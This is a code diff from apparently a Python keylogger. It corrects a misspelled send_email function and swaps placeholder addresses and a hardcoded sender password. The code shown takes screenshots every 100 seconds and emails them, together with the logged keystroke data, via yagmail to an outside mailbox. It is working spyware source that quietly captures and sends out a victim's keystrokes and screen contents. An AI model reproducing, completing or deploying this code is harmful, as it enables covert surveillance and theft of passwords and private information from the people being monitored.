@@ -86,10 +86,10 @@ try:
         myScreenshot.save(r'Evidence.png') #Saves a Screenshot
         
         #Check if it works
-    def send_emal():
-        receiver_emails = ['from_recipient@outlook.com'] #Enther the email where you want to be sent the keylog data
+    def send_email():
+        receiver_emails = ['receiver-email@outlook.com'] #Enter the email which receives the keylog data.
         subject = "Keylog Data" + datetime.now().strftime("%d-%m-%Y %H-%M-%S")   
-        yag=yagmail.SMTP("youemail@gmail.com","you_password") #Enter the Gmail credentials used by the account that will send you the email.
+        yag=yagmail.SMTP("sender-email@gmail.com","throwaway123") #Enter the credentials used by the account that will send you the email.
 
 
         #This is the body of the email that will be sent to you
@@ -108,7 +108,7 @@ try:
         while True:
             time.sleep(100)
             save_screenshot() 
-            send_emal()  
+            send_email()  
         listener.join()
            
            
